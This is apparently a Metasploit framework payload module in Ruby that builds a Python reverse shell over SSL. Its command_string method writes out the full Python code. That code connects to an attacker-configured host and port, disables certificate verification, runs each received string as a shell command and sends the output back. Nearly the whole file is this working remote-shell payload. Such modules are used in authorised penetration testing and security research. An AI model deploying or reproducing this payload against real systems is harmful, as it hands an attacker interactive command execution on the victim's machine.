##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name'        => 'Command Shell, Reverse TCP SSL (via python)',
        'Description' => 'Creates an interactive shell via Python, uses SSL, encodes with base64 by design.',
        'Author'      => [
          'RageLtMan <rageltman[at]sempervictus>'
        ],
        'License'     => MSF_LICENSE,
        'Platform'    => 'python',
        'Arch'        => ARCH_PYTHON,
        'Handler'     => Msf::Handler::ReverseTcpSsl,
        'Session'     => Msf::Sessions::CommandShell,
        'PayloadType' => 'python',
        'Payload'     => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    # ssl.wrap_socket() was deprecated in Python 3.7 and removed in Python 3.12.
    # Use SSLContext.wrap_socket() instead. The getattr chain below selects the
    # best available protocol constant across all supported Python versions:
    #   PROTOCOL_TLS_CLIENT  - Python 3.6+ (preferred, no deprecation warning)
    #   PROTOCOL_TLS         - Python 3.2-3.9 (deprecated in 3.10, removed in 3.12)
    #   PROTOCOL_SSLv23      - Python 2.7.9+ (alias for PROTOCOL_TLS in older releases)
    # check_hostname and verify_mode must be explicitly set because the payload
    # connects to a Metasploit listener with a self-signed certificate.
    <<~PYTHON
      import socket as s
      import subprocess as r
      import ssl
      so=s.socket(s.AF_INET,s.SOCK_STREAM)
      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
      ss=ssl.SSLContext(getattr(ssl,'PROTOCOL_TLS_CLIENT',getattr(ssl,'PROTOCOL_TLS',ssl.PROTOCOL_SSLv23)))
      ss.check_hostname=False
      ss.verify_mode=ssl.CERT_NONE
      so=ss.wrap_socket(so)
      while True:
      \td=so.recv(1024)
      \tif len(d)==0:
      \t\tbreak
      \tp=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
      \to=p.stdout.read()+p.stderr.read()
      \tso.sendall(o)
    PYTHON
  end

end
